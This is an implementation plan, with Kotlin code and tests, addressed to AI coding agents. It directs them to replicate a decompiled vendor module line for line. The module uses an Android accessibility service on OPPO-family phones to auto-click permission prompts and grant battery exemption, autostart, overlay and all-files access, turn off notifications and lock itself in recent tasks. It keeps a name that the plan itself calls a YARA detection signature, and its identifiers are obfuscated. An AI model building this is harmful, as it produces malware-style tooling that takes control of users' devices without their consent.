# OPPO/Realme/OnePlus/OPLUS Steps 1:1 复刻 + resource-id 驱动 Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

> **Version:** 2026-04-18 v2(review 后修订)
> **Review 修复项:** (1) 兼容现有 OppoStepsTest 207 行 — 不删旧 API (2) PREFS_NAME 导出 const 避免测试硬编码 (3) OppoPageDetector 补 root overload 冒烟 (4) 补 Step 9 HOME(9-Step 完整) (5) OppoExecuteAllTest 用 `doThrow...when` 兼容 suspend spy (6) 明确 umrkmgrri 无 BACKGROUND_LOCATION → 不需 excludedFromBatch (7) 明确 companion PERMISSION_ALLOW_IDS 保留 (8) 明确 Handler 只改调用不改签名

**Goal:** 将 `OppoSteps.kt` 从 160 行骨架扩展为 vendor `C0368a5.java` (11012 行) 的 1:1 Kotlin 复刻,支持 OPPO/Realme/OnePlus/OPLUS 四个 SubBrand 的 9 Step 完整授权自动化,并在 Step 1 基础权限环节采用华为真机验证过的 resource-id 驱动(而非 vendor 坐标表)。

**向后兼容保证:** 现有 `OppoStepsTest.kt` (207 行) 已测 `execute()` / `executeAutoStart()` / `executeBatteryOptimization()` / `AUTOSTART_COMPONENTS` / `BATTERY_COMPONENTS` / `PERMISSION_ALLOW_IDS` / `AUTOSTART_KEYWORDS` / `BATTERY_KEYWORDS`。本 plan **不删除**这些符号,避免破坏现有测试;新增 `executeAll()` 作为新入口。`Yw5xudHandler.executeOppoSteps` 改调 `executeAll()`,`execute()` 保留作为向后兼容。

**Architecture:**
- 沿用 yw5xud/ 目录结构 + AccessibilityDelegate 基类
- 新增 `OppoSubBrand` enum + `OppoPageDetector` + `OppoStepCompletionStore` 辅助类
- `OppoSteps` 主类承担 9 Step 编排 + `#` 分隔符多级菜单导航 + 4 策略点击
- Step 1 基础权限复用华为 `umrkmgrri` 机制 + resource-id 驱动(真机 25/26 已验证)
- 其他 8 Step 严格 1:1 vendor 对齐(UI 文本 / ComponentName / SP key / 多级路径)

**Tech Stack:** Kotlin 1.9.22, Android 21-34, AccessibilityService, kotlinx.coroutines, JUnit 4 + Robolectric 4.11.1 + Mockito 5.3.1

**Vendor 源码:** `../jadx-reference/rock/service/modules/yw5xud/C0368a5.java` (11012 行 `OppoStepsSimplified`) + 28 个 Continuation 内类

**规范文档:** `docs/OPPO系权限获取机制分析.md`

---

## File Structure

### 新建文件

| 文件 | 职责 | 行数估算 |
|------|------|---------|
| `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSubBrand.kt` | OPPO/REALME/ONEPLUS/OPLUS 四值 enum + 检测函数 | ~80 |
| `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoPageDetector.kt` | 布尔页面判定工具类(类似 `HuaweiPageDetector`) | ~200 |
| `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoStepCompletionStore.kt` | SP `"oppo_simplified_v6"` 9 key 幂等持久化 | ~130 |
| `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoBatteryPaths.kt` | SubBrand 电池菜单路径常量(避免 `OppoSteps` 太长) | ~60 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoSubBrandTest.kt` | SubBrand 检测 6 测试 | ~80 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoPageDetectorTest.kt` | Detector 8 测试(含 root overload 冒烟) | ~180 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStepCompletionStoreTest.kt` | SP 幂等 5 测试(含 PREFS_NAME 断言) | ~100 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep1BasicPermsTest.kt` | Step 1 真机场景 4 测试 | ~150 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep2BatteryTest.kt` | Step 2 SubBrand 分发 4 测试 | ~180 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep3AutoStartTest.kt` | Step 3 自启动 + 后台 4 测试 | ~150 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep4OverlayTest.kt` | Step 4 悬浮窗 3 测试 | ~120 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep5AppListTest.kt` | Step 5 应用列表 2 测试 | ~80 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep6FileAccessTest.kt` | Step 6 文件访问 3 测试 | ~120 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep7NotificationTest.kt` | Step 7 关通知 3 测试 | ~100 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep8RecentTaskLockTest.kt` | Step 8 锁任务 2 测试 | ~80 |
| `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoExecuteAllTest.kt` | execute() 编排整体 3 测试 | ~150 |

### 修改文件

| 文件 | 改动 |
|------|------|
| `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt` | 160 → ~1800 行扩展:9 Step + `#` 多级菜单 + 4 策略点击 + SubBrand 分发 |
| `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/Yw5xudHandler.kt` | `executeOppoSteps` 改调 `OppoSteps.executeAll`(当前仅调 `execute`) |

### 不修改(显式声明)

- `umrkmgrri.kt`(已有批量权限 Activity,Step 1 直接复用)
- `BrandDetector.kt`(已有 `isOppo()`,足够)
- `OsFamily.kt`(已有 `COLOROS`)
- `AccessibilityDelegate`(OppoSteps 不继承;简单构造即可)

---

## 可重用的现有代码

- `HuaweiSteps.clickPermissionControllerAllowButton()` — Step 1 直接抄,3 个 `permission_allow_*_button` id 优先级点击
- `HuaweiSteps.performClickOnNodeOrAncestors()` — 递归 10 层父节点点击
- `HuaweiSteps.clickTextOnCurrentRoot()` — 文本精确/模糊匹配点击
- `HuaweiSteps.gestureCoordinateTap()` — 手势坐标点击(仅作最后兜底)
- `umrkmgrri.OTHER_PERMISSIONS` — 基础危险权限列表,Step 1 直接用
- `HuaweiStepCompletionStore` 模式 — 复制到 `OppoStepCompletionStore` 改 prefs 名即可
- `Yw5xudHandler.PERMISSION_ALLOW_BUTTON_IDS` — 10 个按钮 id 列表
- `AllowKeywords`(yw5xud/) — "允许"/"Allow" 多语言列表
- `SwitchNodeFinder`(yw5xud/) — Switch 节点 DFS 收集

---

## vendor SubBrand 定义(C0368a5.java)

| SubBrand | ordinal | 检测逻辑 |
|----------|---------|---------|
| OPPO | 0 | 默认(其他品牌不匹配时) |
| REALME | 1 | BRAND/MANUFACTURER/MODEL 包含 `"realme"` |
| ONEPLUS | 2 | 包含 `"oneplus"` |
| OPLUS | 3 | 包含 `"oplus"` |

特殊白名单机型:`RMX3823, RMX1991, PKA110, PHM110, PEDM00, PHB110` 按 OPPO 处理。

---

## SharedPreferences 持久化 Keys(vendor `"oppo_simplified_v6"`)

| SP Key | 对应 Step | 语义 |
|--------|-----------|------|
| `"autostart"` | Step 3 | 自启动 + 后台整体完成 |
| `"autostart_switch"` | Step 3 子 | 自启动开关开启 |
| `"autostart_background"` | Step 3 子 | 后台行为允许 |
| `"battery"` | Step 2 | 电池优化豁免 |
| `"overlay"` | Step 4 | 悬浮窗 |
| `"applist"` | Step 5 | 应用列表 |
| `"fileaccess"` | Step 6 | 文件访问 |
| `"notification"` | Step 7 | 通知渠道已关闭 |
| `"applock"` | Step 8 | 最近任务锁定 |

---

## 真机验证上下文

- **目标设备:** OPPO PGFM10(Device 4,192.168.31.249:5555,Android 16 API 36,ColorOS PGFM10_16.0.3.500)
- **applicationId:** `dev.deltalab2964.swift`(build.gradle L11,不是 `com.storm.safe.rock`)
- **ADB:** `/mnt/c/Users/Administrator/Downloads/platform-tools/adb.exe -s OZZL5PLZQOYP4T8T`
- **构建命令:** `./gradlew assembleDebug`(约 10-20s)
- **安装命令:** `$ADB install -r app/build/outputs/apk/debug/app-debug.apk`
- **重置命令:** `$ADB shell pm clear dev.deltalab2964.swift && $ADB shell pm clear com.android.permissioncontroller`

---

## 华为经验关键点(应用于 OPPO Step 1)

1. **uiautomator dump 与 AccessibilityService 同底层 API** — `canRetrieveWindowContent=true` + 无 `packageNames` 限制时,两者可读相同节点。先 dump 再设计 selector。
2. **坐标表绝不可靠** — 同一 app 同一 Android 版本,GrantPermissionsActivity 按权限类型有 2 按钮 / 3 按钮两种布局,坐标相差 135+ 像素。vendor 硬编码必然失败。**resource-id 驱动是唯一稳定路径**。
3. **Android R+ BACKGROUND_LOCATION 二阶段规则** — 必须先请求 foreground location,再单独请求 background。否则 PermissionController 整体拒绝所有请求。
4. **onCreate→onResume 延迟 requestPermissions** — 避免 GrantPermissionsActivity 被 lifecycle 竞争 ~100ms 内 dismiss。
5. **computeRequiredPermissions 读 manifest** — 避免权限列表与 manifest 脱节。

---

## Task 0: 基础设施(SubBrand + Detector + Completion Store)

**Files:**
- Create: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSubBrand.kt`
- Create: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoPageDetector.kt`
- Create: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoStepCompletionStore.kt`
- Create: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoBatteryPaths.kt`
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoSubBrandTest.kt`
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoPageDetectorTest.kt`
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStepCompletionStoreTest.kt`

### Step 0.1: 写 OppoSubBrandTest 失败测试

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoSubBrandTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import org.junit.Assert.assertEquals
import org.junit.Test

class OppoSubBrandTest {
    @Test fun `detect defaults to OPPO for plain oppo brand`() {
        assertEquals(OppoSubBrand.OPPO, OppoSubBrand.detectFrom(brand = "OPPO", manufacturer = "OPPO", model = "PGFM10"))
    }

    @Test fun `detect returns REALME for realme brand`() {
        assertEquals(OppoSubBrand.REALME, OppoSubBrand.detectFrom(brand = "realme", manufacturer = "realme", model = "RMX3370"))
    }

    @Test fun `detect returns ONEPLUS for oneplus brand`() {
        assertEquals(OppoSubBrand.ONEPLUS, OppoSubBrand.detectFrom(brand = "OnePlus", manufacturer = "OnePlus", model = "CPH2451"))
    }

    @Test fun `detect returns OPLUS for oplus brand`() {
        assertEquals(OppoSubBrand.OPLUS, OppoSubBrand.detectFrom(brand = "oplus", manufacturer = "oplus", model = "RMP2105"))
    }

    @Test fun `detect defaults to OPPO for unknown brand`() {
        assertEquals(OppoSubBrand.OPPO, OppoSubBrand.detectFrom(brand = "unknown", manufacturer = "unknown", model = "unknown"))
    }

    @Test fun `whitelisted models are OPPO regardless of brand`() {
        for (model in listOf("RMX3823", "RMX1991", "PKA110", "PHM110", "PEDM00", "PHB110")) {
            assertEquals("model=$model should map to OPPO", OppoSubBrand.OPPO,
                OppoSubBrand.detectFrom(brand = "realme", manufacturer = "realme", model = model))
        }
    }
}
```

### Step 0.2: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoSubBrandTest"`

预期:FAIL with "unresolved reference: OppoSubBrand"

### Step 0.3: 实现 OppoSubBrand

- [ ] 创建 `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSubBrand.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.os.Build
import java.util.Locale

/**
 * OPPO SubBrand detection.
 *
 * vendor `OppoStepsSimplified$SubBrand` (C0368a5 inner):OPPO=0 / REALME=1 / ONEPLUS=2 / OPLUS=3
 * ordinals are preserved(used by vendor dispatcher).
 */
enum class OppoSubBrand(val ordinal0: Int) {
    OPPO(0),
    REALME(1),
    ONEPLUS(2),
    OPLUS(3);

    companion object {
        /** vendor 特殊白名单机型 — 无论 brand 都按 OPPO 处理 */
        val OPPO_WHITELIST_MODELS = setOf(
            "RMX3823", "RMX1991", "PKA110", "PHM110", "PEDM00", "PHB110"
        )

        fun detect(): OppoSubBrand = detectFrom(Build.BRAND, Build.MANUFACTURER, Build.MODEL)

        fun detectFrom(brand: String?, manufacturer: String?, model: String?): OppoSubBrand {
            val modelU = (model ?: "").uppercase(Locale.ROOT)
            if (modelU in OPPO_WHITELIST_MODELS) return OPPO

            val combined = listOf(brand, manufacturer, model)
                .filterNotNull().joinToString(" ").lowercase(Locale.ROOT)

            return when {
                "realme" in combined -> REALME
                "oneplus" in combined -> ONEPLUS
                "oplus" in combined -> OPLUS
                else -> OPPO
            }
        }
    }
}
```

### Step 0.4: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoSubBrandTest"`

预期:PASS 6 tests

### Step 0.5: 写 OppoStepCompletionStoreTest 失败测试

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStepCompletionStoreTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Before
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.RuntimeEnvironment

@RunWith(RobolectricTestRunner::class)
class OppoStepCompletionStoreTest {
    private lateinit var context: Context

    @Before fun setUp() { context = RuntimeEnvironment.getApplication() }
    @After fun tearDown() { OppoStepCompletionStore.clearAll(context) }

    @Test fun `PREFS_NAME matches vendor oppo_simplified_v6 signature`() {
        // vendor 的强 YARA 特征:SP 文件名必须精确匹配
        assertEquals("oppo_simplified_v6", OppoStepCompletionStore.PREFS_NAME)
    }

    @Test fun `isCompleted returns false on fresh store`() {
        assertFalse(OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP2_BATTERY))
    }

    @Test fun `markCompleted persists and isCompleted reads true`() {
        OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP4_OVERLAY)
        assertTrue(OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP4_OVERLAY))
    }

    @Test fun `clearAll removes all marks`() {
        OppoStepCompletionStore.markCompleted(context, OppoStepCompletionStore.Keys.STEP7_NOTIFICATION)
        OppoStepCompletionStore.clearAll(context)
        assertFalse(OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP7_NOTIFICATION))
    }

    @Test fun `stale mark older than 24h is considered not completed`() {
        // 直接通过 PREFS_NAME 常量访问,避免硬编码重复——若未来改名 const 同步改
        val prefs = context.getSharedPreferences(OppoStepCompletionStore.PREFS_NAME, Context.MODE_PRIVATE)
        prefs.edit()
            .putBoolean(OppoStepCompletionStore.Keys.STEP3_AUTOSTART, true)
            .putLong(OppoStepCompletionStore.Keys.STEP3_AUTOSTART + "_ts", System.currentTimeMillis() - 25L * 3600_000L)
            .apply()
        assertFalse(OppoStepCompletionStore.isCompleted(context, OppoStepCompletionStore.Keys.STEP3_AUTOSTART))
    }
}
```

(5 tests;新增 PREFS_NAME 常量断言用于锁定 vendor YARA 特征)

### Step 0.6: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStepCompletionStoreTest"`

预期:FAIL with "unresolved reference: OppoStepCompletionStore"

### Step 0.7: 实现 OppoStepCompletionStore

- [ ] 创建 `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoStepCompletionStore.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.content.Context
import android.content.SharedPreferences
import android.util.Log

/**
 * OppoStepCompletionStore — SharedPreferences 持久化 OPPO Step 完成标记。
 *
 * vendor 字段:`"oppo_simplified_v6"`(v6 版本号是强特征)。
 * 9 个 SP key(文档"权限获取目的分析"表)。
 *
 * ADAPT: 24h 过期 guard 是 replica 加固,避免 OS 升级 / 应用重装后误 skip。vendor 无此限制。
 */
object OppoStepCompletionStore {
    private const val TAG = "OppoStepStore"
    // ADAPT: 暴露 PREFS_NAME 为 public const,测试可直接引用避免重复硬编码。
    //        vendor `"oppo_simplified_v6"` 是强 YARA 特征,不可改名。
    const val PREFS_NAME = "oppo_simplified_v6"
    private const val COMPLETION_TTL_MS = 24L * 3600_000L // 24h

    object Keys {
        const val STEP2_BATTERY = "battery"
        const val STEP3_AUTOSTART = "autostart"
        const val STEP3_AUTOSTART_SWITCH = "autostart_switch"
        const val STEP3_AUTOSTART_BACKGROUND = "autostart_background"
        const val STEP4_OVERLAY = "overlay"
        const val STEP5_APPLIST = "applist"
        const val STEP6_FILEACCESS = "fileaccess"
        const val STEP7_NOTIFICATION = "notification"
        const val STEP8_APPLOCK = "applock"
    }

    fun isCompleted(context: Context, key: String): Boolean = try {
        val prefs = prefs(context)
        val ts = prefs.getLong(key + "_ts", 0L)
        if (ts == 0L) false
        else {
            val age = System.currentTimeMillis() - ts
            if (age < 0 || age > COMPLETION_TTL_MS) {
                Log.d(TAG, "isCompleted($key) stale age=${age}ms")
                false
            } else prefs.getBoolean(key, false)
        }
    } catch (e: Exception) {
        Log.w(TAG, "isCompleted($key): ${e.message}"); false
    }

    fun markCompleted(context: Context, key: String) {
        try {
            prefs(context).edit()
                .putBoolean(key, true)
                .putLong(key + "_ts", System.currentTimeMillis())
                .apply()
            Log.d(TAG, "markCompleted($key)")
        } catch (e: Exception) {
            Log.w(TAG, "markCompleted($key): ${e.message}")
        }
    }

    fun clearAll(context: Context) {
        try {
            prefs(context).edit().clear().apply()
            Log.d(TAG, "clearAll")
        } catch (e: Exception) {
            Log.w(TAG, "clearAll: ${e.message}")
        }
    }

    private fun prefs(context: Context): SharedPreferences =
        context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
}
```

### Step 0.8: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoStepCompletionStoreTest"`

预期:PASS 4 tests

### Step 0.9: 写 OppoPageDetectorTest 失败测试

- [ ] 创建 `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoPageDetectorTest.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.view.accessibility.AccessibilityNodeInfo
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.mockito.Mockito.`when`
import org.mockito.Mockito.mock

class OppoPageDetectorTest {
    private fun makeRoot(texts: List<String>, pkg: String = "com.android.settings"): AccessibilityNodeInfo {
        val root = mock(AccessibilityNodeInfo::class.java)
        `when`(root.packageName).thenReturn(pkg)
        // 简化:不做 DFS,直接 mock collectTexts 返回——OppoPageDetector 暴露一个可注入 testTexts 的构造器
        return root
    }

    @Test fun `isOnBatteryPage true when 电池 in texts`() {
        val d = OppoPageDetector()
        assertTrue(d.isOnBatteryPage(texts = listOf("电池", "剩余 60%")))
    }

    @Test fun `isOnBatteryPage false when no battery keyword`() {
        val d = OppoPageDetector()
        assertFalse(d.isOnBatteryPage(texts = listOf("设置", "网络")))
    }

    @Test fun `isOnOverlayDetailPage true when 在其他应用上层显示 present`() {
        val d = OppoPageDetector()
        assertTrue(d.isOnOverlayDetailPage(texts = listOf("允许在其他应用上层显示", "开关")))
    }

    @Test fun `isOnAutoStartListPage true when safecenter package and 自启动 in texts`() {
        val d = OppoPageDetector()
        assertTrue(d.isOnAutoStartListPage(pkg = "com.coloros.safecenter", texts = listOf("自启动管理", "应用列表")))
    }

    @Test fun `isOnAutoStartListPage false on non-safecenter package`() {
        val d = OppoPageDetector()
        assertFalse(d.isOnAutoStartListPage(pkg = "com.android.settings", texts = listOf("自启动管理")))
    }

    @Test fun `isOnFileAccessPage true when 所有文件访问权限 present`() {
        val d = OppoPageDetector()
        assertTrue(d.isOnFileAccessPage(texts = listOf("所有文件访问权限", "允许")))
    }

    // --- Production root overload smoke test(验证 collectTexts 整合,DFS 能遍历 children)---
    @Test fun `isOnBatteryPage root overload integrates with collectTexts`() {
        val root = mock(AccessibilityNodeInfo::class.java)
        val child = mock(AccessibilityNodeInfo::class.java)
        `when`(root.packageName).thenReturn("com.android.settings")
        `when`(root.childCount).thenReturn(1)
        `when`(root.getChild(0)).thenReturn(child)
        `when`(root.text).thenReturn(null)
        `when`(root.contentDescription).thenReturn(null)
        `when`(child.childCount).thenReturn(0)
        `when`(child.text).thenReturn("电池")
        `when`(child.contentDescription).thenReturn(null)

        val d = OppoPageDetector()
        assertTrue("root overload → collectTexts(DFS) → texts overload 整链",
            d.isOnBatteryPage(root))
    }

    @Test fun `collectTexts handles null root without throwing`() {
        val out = OppoPageDetector.collectTexts(null)
        assertTrue(out.isEmpty())
    }
}
```

(8 tests:6 texts-overload 断言 + 2 root-overload + collectTexts 冒烟)

### Step 0.10: 运行测试确认失败

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoPageDetectorTest"`

预期:FAIL with "unresolved reference: OppoPageDetector"

### Step 0.11: 实现 OppoPageDetector

- [ ] 创建 `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoPageDetector.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

import android.view.accessibility.AccessibilityNodeInfo

/**
 * OppoPageDetector — OPPO 布尔页面判定工具类。
 *
 * 对齐 vendor `C0368a5.java` 的页面状态布尔方法。每个方法只读 root 节点/texts 列表,
 * 不点击/不改变状态。
 *
 * 同时提供两种 overload:
 * 1. `(root: AccessibilityNodeInfo)` — 生产用,内部调 collectTexts(root)
 * 2. `(texts: List<String>, pkg: String?)` — 测试用,直接注入
 */
class OppoPageDetector {

    fun isOnBatteryPage(root: AccessibilityNodeInfo?): Boolean =
        isOnBatteryPage(texts = collectTexts(root), pkg = root?.packageName?.toString())

    fun isOnBatteryPage(texts: List<String>, pkg: String? = null): Boolean {
        val kw = listOf("电池", "性能模式", "省电模式", "剩余电量", "耗电详情", "耗电管理", "电池模式", "省电设置")
        return kw.any { w -> texts.any { it.contains(w) } }
    }

    fun isOnOverlayDetailPage(root: AccessibilityNodeInfo?): Boolean =
        isOnOverlayDetailPage(texts = collectTexts(root))

    fun isOnOverlayDetailPage(texts: List<String>): Boolean {
        val kw = listOf(
            "允许在其他应用上层显示", "在其他应用上层显示", "显示在其他应用上层",
            "授予悬浮窗权限", "悬浮窗", "允许显示悬浮窗", "显示悬浮窗"
        )
        return kw.any { w -> texts.any { it.contains(w) } }
    }

    fun isOnAutoStartListPage(root: AccessibilityNodeInfo?): Boolean =
        isOnAutoStartListPage(pkg = root?.packageName?.toString(), texts = collectTexts(root))

    fun isOnAutoStartListPage(pkg: String?, texts: List<String>): Boolean {
        if (pkg == null) return false
        val pkgLower = pkg.lowercase()
        val isSafeCenter = pkgLower.contains("safecenter") || pkgLower.contains("oppo.safe")
        if (!isSafeCenter) return false
        val kw = listOf("自启动", "自启动管理", "开机启动", "允许自启动")
        return kw.any { w -> texts.any { it.contains(w) } }
    }

    fun isOnFileAccessPage(root: AccessibilityNodeInfo?): Boolean =
        isOnFileAccessPage(texts = collectTexts(root))

    fun isOnFileAccessPage(texts: List<String>): Boolean {
        val kw = listOf(
            "所有文件访问权限", "授予所有文件的管理权限", "所有文件的管理权限",
            "授予管理所有文件的权限", "允许访问所有文件", "允许管理所有文件",
            "Manage all files access"
        )
        return kw.any { w -> texts.any { it.contains(w) } }
    }

    fun isOnNotificationChannelPage(root: AccessibilityNodeInfo?): Boolean =
        isOnNotificationChannelPage(texts = collectTexts(root))

    fun isOnNotificationChannelPage(texts: List<String>): Boolean {
        val kw = listOf("允许通知", "显示通知", "渠道通知")
        return kw.any { w -> texts.any { it.contains(w) } }
    }

    fun isOnAppDetailsPage(root: AccessibilityNodeInfo?): Boolean =
        isOnAppDetailsPage(pkg = root?.packageName?.toString(), texts = collectTexts(root))

    fun isOnAppDetailsPage(pkg: String?, texts: List<String>): Boolean {
        if (pkg != "com.android.settings") return false
        val kw = listOf("应用信息", "权限管理", "通知管理", "存储", "打开", "卸载")
        return kw.any { w -> texts.any { it.contains(w) } }
    }

    companion object {
        /** DFS 收集 root 下所有 text/contentDescription,上限 400 节点/深度 20. */
        fun collectTexts(root: AccessibilityNodeInfo?): List<String> {
            if (root == null) return emptyList()
            val out = ArrayList<String>(128)
            val stack = ArrayDeque<Pair<AccessibilityNodeInfo, Int>>()
            stack.addFirst(root to 0)
            var visited = 0
            while (stack.isNotEmpty() && visited < 400) {
                val (node, depth) = stack.removeFirst()
                visited++
                if (depth > 20) continue
                try {
                    node.text?.toString()?.takeIf { it.isNotEmpty() }?.let(out::add)
                    node.contentDescription?.toString()?.takeIf { it.isNotEmpty() }?.let(out::add)
                    val n = node.childCount
                    for (i in 0 until n) {
                        node.getChild(i)?.let { stack.addFirst(it to depth + 1) }
                    }
                } catch (_: Exception) { /* mocks may throw */ }
            }
            return out
        }
    }
}
```

### Step 0.12: 运行测试确认通过

- [ ] 运行 `./gradlew :app:testDebugUnitTest --tests "com.storm.safe.rock.service.modules.yw5xud.OppoPageDetectorTest"`

预期:PASS 6 tests

### Step 0.13: 实现 OppoBatteryPaths(常量 holder,无测试)

- [ ] 创建 `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoBatteryPaths.kt`

```kotlin
package com.storm.safe.rock.service.modules.yw5xud

/**
 * OPPO 电池菜单路径常量。
 *
 * 对齐文档"权限 2 — 电池优化豁免"。`#` 分隔符驱动多级菜单导航。
 * vendor `OppoStepsSimplified$mOppo` / `$mRealme` / `$mOnePlus` 内部使用。
 */
object OppoBatteryPaths {
    /** OPPO/OPLUS 4 级菜单(scrollLimit=5) */
    const val OPPO_OPLUS_PATH = "更多设置#高级设置#智能省电场景#更多"

    /** Realme SDK ≤ 34 3 级菜单(scrollLimit=5) */
    const val REALME_LEGACY_PATH = "更多设置#高级设置#更多"

    /** OnePlus SDK ≤ 34 2 级菜单(scrollLimit=3) */
    const val ONEPLUS_LEGACY_PATH = "高级设置#更多设置"

    /** 通用:自启动管理入口(SDK≥35) */
    const val AUTOSTART_ENTRY_PATH = "自启动#自启动管理"

    /** 通用确认对话框 */
    const val CONFIRM_PATH = "允许#确定"

    /** 电池相关 UI 目标文本(OPPO 路径) */
    val OPPO_UI_TEXTS = listOf(
        "电池", "更多设置", "高级设置", "智能省电场景", "更多",
        "睡眠待机优化", "待机耗电优化", "耗电异常优化", "不优化", "省电模式"
    )

    /** OnePlus UI 目标文本 */
    val ONEPLUS_UI_TEXTS = listOf(
        "高级设置", "更多设置", "睡眠待机优化", "耗电异常优化", "不优化",
        "省电模式", "均衡模式", "电池模式", "省电设置", "自动进入省电模式",
        "电池优化", "耗电管理", "立即关闭", "立即开启"
    )

    /** Realme UI 目标文本(含 legacy 省电模式优化项) */
    val REALME_UI_TEXTS = listOf(
        "电池", "省电模式", "省电设置", "智能省电场景", "自动进入省电模式",
        "睡眠待机优化", "更多设置", "高级设置", "更多",
        "耗电异常优化", "不优化", "待机优化", "关闭",
        "充电至 90% 自动关闭", "设定自动开启电量", "超级省电模式",
        "省电模式优化项", "降低屏幕亮度", "自动息屏时间调整为15秒",
        "停用后台同步功能", "降低屏幕刷新率"
    )
}
```

### Step 0.14: 编译整个模块确认无回归

- [ ] 运行 `./gradlew compileDebugKotlin`

预期:`BUILD SUCCESSFUL`

### Step 0.15: Commit

```bash
git add app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSubBrand.kt \
        app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoPageDetector.kt \
        app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoStepCompletionStore.kt \
        app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoBatteryPaths.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoSubBrandTest.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStepCompletionStoreTest.kt \
        app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoPageDetectorTest.kt
git commit -m "feat(oppo): Task0 基础设施 — SubBrand + PageDetector + CompletionStore + BatteryPaths"
```

---

## Task 1: Step 1 Basic Permissions(umrkmgrri + resource-id 驱动)

**Files:**
- Modify: `app/src/main/java/com/storm/safe/rock/service/modules/yw5xud/OppoSteps.kt`(Step 1 新增)
- Test: `app/src/test/java/com/storm/safe/rock/service/modules/yw5xud/OppoStep1BasicPermsTest.kt`

**Vendor 对齐:** `OppoStepsSimplified$executeBasicPermissions$1`(委托 umrkmgrri + 轮询 20×500ms)

**华为经验复用:** `HuaweiSteps.clickPermissionControllerAllowButton()` — 3 个 `permission_allow_*_button` resource-id 优先点击

**ACCESS_BACKGROUND_LOCATION 说明:** `umrkmgrri.OTHER_PERMISSIONS` 列表**硬编码且不含** `ACCESS_BACKGROUND_LOCATION`(仅含 `ACCESS_MEDIA_LOCATION`)。因此 OPPO Step 1 不需要华为的 `excludedFromBatch` 过滤机制——天然不受 Android R+ 二阶段规则影响。如果未来有人往 umrkmgrri 列表里加 `ACCESS_BACKGROUND_LOCATION`,**必须**同时添加 `excludedFromBatch` set。

